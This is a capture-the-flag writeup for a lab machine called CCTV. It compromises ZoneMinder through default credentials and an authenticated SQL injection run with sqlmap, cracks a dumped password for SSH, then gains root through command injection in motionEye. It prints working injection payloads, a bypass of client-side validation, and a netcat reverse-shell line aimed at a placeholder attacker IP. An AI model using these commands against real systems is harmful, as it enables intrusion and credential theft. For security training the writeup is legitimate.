# CCTV — Full Writeup

## Overview

The objective of this machine was to obtain initial access through a web application and escalate privileges to `root`.

The full compromise chain was achieved through:

1. service enumeration;
2. discovery of a ZoneMinder instance;
3. authentication using default credentials;
4. exploitation of an authenticated SQL injection vulnerability;
5. database extraction and credential recovery;
6. SSH access via password cracking;
7. local enumeration of internal services;
8. abuse of a misconfigured motionEye service;
9. command injection leading to root-level remote code execution.

---

## 1. Initial Reconnaissance

The first step was to enumerate open TCP ports:

```bash
nmap -sC -sV -T4 10.129.15.174
```

Open ports:

- `22/tcp` → SSH  
- `80/tcp` → HTTP (Apache 2.4.58 Ubuntu)

The attack surface suggested a web-based entry point.

---

## 2. Web Enumeration

The web application was accessible at:

```
http://cctv.htb
```

### Directory Fuzzing

```bash
ffuf -u http://cctv.htb/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-mc 200,301,302,307,401,403 \
-fc 404 -c -t 50
```

Findings:

- `/javascript` → redirect  
- `/cgi-bin` → 403  
- `/index.html`

Further exploration revealed:

```
http://cctv.htb/zm/
```

The application was identified as **ZoneMinder**.

---

## 3. Initial Access

Default credentials were tested:

```
admin:admin
```

Authentication was successful, granting access to the ZoneMinder dashboard.

---

## 4. Vulnerability Identification

The application version was identified as:

```
ZoneMinder 1.37.63
```

This version is vulnerable to:

- **CVE-2024-51482**
- **CVE-2024-51428**

Vulnerability type:

- Authenticated SQL Injection (time-based / boolean-based)

Affected endpoint:

```
/zm/index.php?view=request&request=event&action=removetag
```

Vulnerable parameter:

```
tid
```

---

## 5. Exploitation — SQL Injection

### Initial Request

```bash
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

### SQLMap Exploitation

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=<SESSION>" \
-p tid \
--dbms=mysql \
--batch
```

### Injection Details

- Type: time-based blind  
- Payload: `AND (SELECT SLEEP(1))`  
- DBMS: MySQL ≥ 8.0  

---

## 6. Database Enumeration

```bash
sqlmap --dbs
```

Databases:

- `information_schema`
- `performance_schema`
- `zm`

### Tables

```bash
sqlmap -D zm --tables
```

### Dumping Credentials

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=<SESSION>" \
-p tid \
--dbms=mysql \
--batch \
-D zm -T Users -C Username,Password --dump
```

Extracted users:

| Username    | Password (bcrypt) |
|------------|-------------------|
| superadmin | `$2y$10$cmytVWFR...` |
| mark       | `$2y$10$prZGnazejKc...` |
| admin      | `$2y$10$t5z8uIT...` |

---

## 7. SSH Access

The hash for user `mark` was cracked:

```
mark:opensesame
```

SSH access:

```bash
ssh mark@cctv.htb
```

---

## 8. Local Enumeration

### Sudo Check

```bash
sudo -l
```

No privilege escalation via sudo.

### Internal Services

```bash
ss -tulnp
```

Discovered services:

- `127.0.0.1:8765` → motionEye  
- `127.0.0.1:7999` → motion backend  
- `127.0.0.1:3306` → MySQL  

---

## 9. motionEye Configuration Disclosure

The configuration file was inspected:

```bash
cat /etc/motioneye/motion.conf
```

Relevant lines:

```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

The password hash was directly usable for authentication.

---

## 10. Port Forwarding

Access to the internal service was obtained via SSH tunneling:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Then accessed locally:

```
http://127.0.0.1:8765
```

---

## 11. Exploitation — Command Injection

The web interface blocked special characters, preventing direct command injection.

### Bypass

Client-side validation was disabled via browser console:

```javascript
configUiValid = function() { return true; }
```

### Payload Injection

Injected into the **Image File Name** field:

```bash
$(touch /tmp/pwned).%Y-%m-%d-%H-%M-%S
```

### Trigger Execution

```bash
curl http://127.0.0.1:7999/1/action/snapshot
```

### Verification

```bash
ls /tmp
```

Output:

```
pwned
```

---

## 12. Root Shell

### Reverse Shell Payload

```bash
$(nc <ATTACKER_IP> 4444 -e /bin/bash).%Y-%m-%d-%H-%M-%S
```

### Listener

```bash
nc -lvnp 4444
```

Result:

```
root@cctv:/etc/motioneye#
```

---

## 13. Flags

### User Flag

```bash
cat /home/sa_mark/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```


---


## 15. Attack Chain Summary

- Web enumeration → ZoneMinder discovery  
- Default credentials → authenticated access  
- SQL injection → database dump  
- Credential cracking → SSH access (`mark`)  
- Internal service discovery → motionEye  
- Configuration disclosure → admin access  
- Command injection → root shell